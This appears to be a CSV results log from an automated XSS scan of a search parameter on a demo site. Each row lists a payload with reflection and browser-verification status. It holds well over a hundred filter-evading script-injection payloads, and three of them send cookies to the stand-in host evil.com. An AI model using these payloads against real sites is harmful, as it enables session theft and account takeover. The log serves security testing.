Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:26:55.193,2026-01-10 17:26:55.317,0.123,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.297,2026-01-10 17:26:55.399,0.103,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.297,2026-01-10 17:26:55.400,0.103,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.306,2026-01-10 17:26:55.439,0.133,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.309,2026-01-10 17:26:55.440,0.131,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.309,2026-01-10 17:26:55.442,0.133,https://demo-knsl.onrender.com/search,GET,q,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.306,2026-01-10 17:26:55.442,0.136,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.317,2026-01-10 17:26:55.461,0.144,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:54.575,2026-01-10 17:26:55.469,0.895,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:26:55.399,2026-01-10 17:26:55.543,0.144,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.400,2026-01-10 17:26:55.543,0.143,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:54.623,2026-01-10 17:26:55.580,0.957,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:26:54.669,2026-01-10 17:26:55.580,0.911,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:26:55.439,2026-01-10 17:26:55.669,0.230,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.442,2026-01-10 17:26:55.669,0.227,https://demo-knsl.onrender.com/search,GET,q,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.442,2026-01-10 17:26:55.674,0.231,https://demo-knsl.onrender.com/search,GET,q,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.543,2026-01-10 17:26:55.680,0.136,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.543,2026-01-10 17:26:55.680,0.136,https://demo-knsl.onrender.com/search,GET,q,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.580,2026-01-10 17:26:55.834,0.253,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.674,2026-01-10 17:26:55.834,0.160,https://demo-knsl.onrender.com/search,GET,q,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.680,2026-01-10 17:26:55.838,0.158,https://demo-knsl.onrender.com/search,GET,q,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.669,2026-01-10 17:26:55.838,0.169,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.580,2026-01-10 17:26:55.842,0.262,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.680,2026-01-10 17:26:55.842,0.163,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.669,2026-01-10 17:26:55.846,0.178,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.834,2026-01-10 17:26:55.951,0.118,https://demo-knsl.onrender.com/search,GET,q,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.838,2026-01-10 17:26:55.952,0.114,https://demo-knsl.onrender.com/search,GET,q,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.834,2026-01-10 17:26:55.954,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.838,2026-01-10 17:26:55.955,0.117,https://demo-knsl.onrender.com/search,GET,q,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.842,2026-01-10 17:26:55.962,0.120,https://demo-knsl.onrender.com/search,GET,q,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.846,2026-01-10 17:26:55.962,0.116,https://demo-knsl.onrender.com/search,GET,q,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.842,2026-01-10 17:26:55.965,0.123,https://demo-knsl.onrender.com/search,GET,q,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.952,2026-01-10 17:26:56.072,0.120,https://demo-knsl.onrender.com/search,GET,q,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.955,2026-01-10 17:26:56.076,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.954,2026-01-10 17:26:56.076,0.122,https://demo-knsl.onrender.com/search,GET,q,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.951,2026-01-10 17:26:56.111,0.159,https://demo-knsl.onrender.com/search,GET,q,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.962,2026-01-10 17:26:56.123,0.161,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.965,2026-01-10 17:26:56.125,0.159,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.962,2026-01-10 17:26:56.126,0.164,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.072,2026-01-10 17:26:56.191,0.119,https://demo-knsl.onrender.com/search,GET,q,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.076,2026-01-10 17:26:56.191,0.116,https://demo-knsl.onrender.com/search,GET,q,<script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.076,2026-01-10 17:26:56.195,0.119,https://demo-knsl.onrender.com/search,GET,q,alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.111,2026-01-10 17:26:56.222,0.111,https://demo-knsl.onrender.com/search,GET,q,</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.123,2026-01-10 17:26:56.224,0.100,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.125,2026-01-10 17:26:56.225,0.101,https://demo-knsl.onrender.com/search,GET,q,<svg,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.126,2026-01-10 17:26:56.231,0.105,https://demo-knsl.onrender.com/search,GET,q,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.195,2026-01-10 17:26:56.305,0.110,https://demo-knsl.onrender.com/search,GET,q,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.191,2026-01-10 17:26:56.305,0.114,https://demo-knsl.onrender.com/search,GET,q,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.191,2026-01-10 17:26:56.314,0.123,https://demo-knsl.onrender.com/search,GET,q,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.231,2026-01-10 17:26:56.335,0.104,https://demo-knsl.onrender.com/search,GET,q,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.224,2026-01-10 17:26:56.335,0.111,https://demo-knsl.onrender.com/search,GET,q,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.222,2026-01-10 17:26:56.337,0.115,https://demo-knsl.onrender.com/search,GET,q,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.225,2026-01-10 17:26:56.347,0.121,https://demo-knsl.onrender.com/search,GET,q,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.461,2026-01-10 17:26:56.352,0.891,https://demo-knsl.onrender.com/search,GET,q,javascript:alert('XSS'),RAW_REFLECTION,No,,High
2026-01-10 17:26:55.469,2026-01-10 17:26:56.355,0.886,https://demo-knsl.onrender.com/search,GET,q,javascript:prompt(1),RAW_REFLECTION,No,,High
2026-01-10 17:26:56.305,2026-01-10 17:26:56.423,0.118,https://demo-knsl.onrender.com/search,GET,q,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.305,2026-01-10 17:26:56.423,0.118,https://demo-knsl.onrender.com/search,GET,q,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.352,2026-01-10 17:26:56.463,0.110,https://demo-knsl.onrender.com/search,GET,q,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.347,2026-01-10 17:26:56.463,0.117,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.355,2026-01-10 17:26:56.470,0.115,https://demo-knsl.onrender.com/search,GET,q,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.335,2026-01-10 17:26:56.472,0.138,https://demo-knsl.onrender.com/search,GET,q,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.335,2026-01-10 17:26:56.483,0.149,https://demo-knsl.onrender.com/search,GET,q,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:55.440,2026-01-10 17:26:56.496,1.056,https://demo-knsl.onrender.com/search,GET,q,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:26:56.423,2026-01-10 17:26:56.543,0.120,https://demo-knsl.onrender.com/search,GET,q,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.423,2026-01-10 17:26:56.544,0.121,https://demo-knsl.onrender.com/search,GET,q,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.470,2026-01-10 17:26:56.575,0.105,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.483,2026-01-10 17:26:56.579,0.096,https://demo-knsl.onrender.com/search,GET,q,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.463,2026-01-10 17:26:56.582,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.496,2026-01-10 17:26:56.604,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.463,2026-01-10 17:26:56.623,0.161,https://demo-knsl.onrender.com/search,GET,q,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.543,2026-01-10 17:26:56.646,0.103,https://demo-knsl.onrender.com/search,GET,q,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.544,2026-01-10 17:26:56.655,0.111,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.604,2026-01-10 17:26:56.770,0.167,https://demo-knsl.onrender.com/search,GET,q,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.575,2026-01-10 17:26:56.771,0.196,https://demo-knsl.onrender.com/search,GET,q,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.579,2026-01-10 17:26:56.775,0.196,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.582,2026-01-10 17:26:56.776,0.194,https://demo-knsl.onrender.com/search,GET,q,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.337,2026-01-10 17:26:56.778,0.440,https://demo-knsl.onrender.com/search,GET,q,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.623,2026-01-10 17:26:56.781,0.157,https://demo-knsl.onrender.com/search,GET,q,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.655,2026-01-10 17:26:56.781,0.125,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.646,2026-01-10 17:26:56.783,0.136,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.472,2026-01-10 17:26:56.786,0.314,https://demo-knsl.onrender.com/search,GET,q,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.776,2026-01-10 17:26:56.878,0.103,https://demo-knsl.onrender.com/search,GET,q,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.771,2026-01-10 17:26:56.879,0.108,https://demo-knsl.onrender.com/search,GET,q,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.770,2026-01-10 17:26:56.880,0.110,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.786,2026-01-10 17:26:56.882,0.097,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.783,2026-01-10 17:26:56.966,0.183,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.781,2026-01-10 17:26:56.967,0.186,https://demo-knsl.onrender.com/search,GET,q,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.776,2026-01-10 17:26:56.969,0.193,https://demo-knsl.onrender.com/search,GET,q,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.314,2026-01-10 17:26:57.061,0.746,https://demo-knsl.onrender.com/search,GET,q,< svg onload=alert(1) >,RAW_REFLECTION,No,,High
2026-01-10 17:26:56.880,2026-01-10 17:26:57.117,0.237,https://demo-knsl.onrender.com/search,GET,q,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.878,2026-01-10 17:26:57.117,0.239,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.969,2026-01-10 17:26:57.122,0.153,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.967,2026-01-10 17:26:57.123,0.157,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.882,2026-01-10 17:26:57.126,0.244,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.781,2026-01-10 17:26:57.131,0.350,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.778,2026-01-10 17:26:57.131,0.353,https://demo-knsl.onrender.com/search,GET,q,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.966,2026-01-10 17:26:57.182,0.216,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.061,2026-01-10 17:26:57.205,0.145,https://demo-knsl.onrender.com/search,GET,q,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.117,2026-01-10 17:26:57.228,0.111,https://demo-knsl.onrender.com/search,GET,q,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.122,2026-01-10 17:26:57.234,0.112,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.131,2026-01-10 17:26:57.234,0.104,https://demo-knsl.onrender.com/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.117,2026-01-10 17:26:57.236,0.119,https://demo-knsl.onrender.com/search,GET,q,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.123,2026-01-10 17:26:57.240,0.117,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:56.879,2026-01-10 17:26:57.247,0.368,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.234,2026-01-10 17:26:57.341,0.106,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable onblur=alert(1)>test</div>,NO_REFLECTION,No,,Info
2026-01-10 17:26:57.182,2026-01-10 17:26:57.342,0.160,https://demo-knsl.onrender.com/search,GET,q,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.205,2026-01-10 17:26:57.342,0.137,https://demo-knsl.onrender.com/search,GET,q,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.234,2026-01-10 17:26:57.365,0.130,https://demo-knsl.onrender.com/search,GET,q,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.247,2026-01-10 17:26:57.366,0.119,https://demo-knsl.onrender.com/search,GET,q,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.236,2026-01-10 17:26:57.367,0.131,https://demo-knsl.onrender.com/search,GET,q,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.341,2026-01-10 17:26:57.411,0.070,https://demo-knsl.onrender.com/search,GET,q,<svg><animatemotion onbegin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:26:57.228,2026-01-10 17:26:57.414,0.186,https://demo-knsl.onrender.com/search,GET,q,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.365,2026-01-10 17:26:57.435,0.070,https://demo-knsl.onrender.com/search,GET,q,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,NO_REFLECTION,No,,Info
2026-01-10 17:26:57.342,2026-01-10 17:26:57.461,0.119,https://demo-knsl.onrender.com/search,GET,q,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.342,2026-01-10 17:26:57.462,0.120,https://demo-knsl.onrender.com/search,GET,q,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.367,2026-01-10 17:26:57.485,0.118,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.366,2026-01-10 17:26:57.495,0.128,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.240,2026-01-10 17:26:57.497,0.257,https://demo-knsl.onrender.com/search,GET,q,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.414,2026-01-10 17:26:57.517,0.103,https://demo-knsl.onrender.com/search,GET,q,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.411,2026-01-10 17:26:57.522,0.111,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.435,2026-01-10 17:26:57.546,0.111,https://demo-knsl.onrender.com/search,GET,q,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.462,2026-01-10 17:26:57.574,0.112,https://demo-knsl.onrender.com/search,GET,q,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.461,2026-01-10 17:26:57.574,0.113,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.485,2026-01-10 17:26:57.598,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.497,2026-01-10 17:26:57.598,0.101,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.522,2026-01-10 17:26:57.626,0.104,https://demo-knsl.onrender.com/search,GET,q,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.517,2026-01-10 17:26:57.628,0.111,https://demo-knsl.onrender.com/search,GET,q,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.546,2026-01-10 17:26:57.669,0.123,https://demo-knsl.onrender.com/search,GET,q,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.574,2026-01-10 17:26:57.685,0.111,https://demo-knsl.onrender.com/search,GET,q,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.574,2026-01-10 17:26:57.685,0.111,https://demo-knsl.onrender.com/search,GET,q,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.598,2026-01-10 17:26:57.716,0.118,https://demo-knsl.onrender.com/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.598,2026-01-10 17:26:57.723,0.125,https://demo-knsl.onrender.com/search,GET,q,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.628,2026-01-10 17:26:57.749,0.121,https://demo-knsl.onrender.com/search,GET,q,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.626,2026-01-10 17:26:57.750,0.124,https://demo-knsl.onrender.com/search,GET,q,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.669,2026-01-10 17:26:57.774,0.105,https://demo-knsl.onrender.com/search,GET,q,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.685,2026-01-10 17:26:57.784,0.099,https://demo-knsl.onrender.com/search,GET,q,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.685,2026-01-10 17:26:57.795,0.110,https://demo-knsl.onrender.com/search,GET,q,﻿<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.716,2026-01-10 17:26:57.823,0.107,https://demo-knsl.onrender.com/search,GET,q,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.723,2026-01-10 17:26:57.843,0.120,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.795,2026-01-10 17:26:57.870,0.075,https://demo-knsl.onrender.com/search,GET,q,<button autofocus onfocus=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:26:57.749,2026-01-10 17:26:57.871,0.122,https://demo-knsl.onrender.com/search,GET,q,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.750,2026-01-10 17:26:57.871,0.121,https://demo-knsl.onrender.com/search,GET,q,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:26:57.774,2026-01-10 17:26:57.878,0.103,https://demo-knsl.onrender.com/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
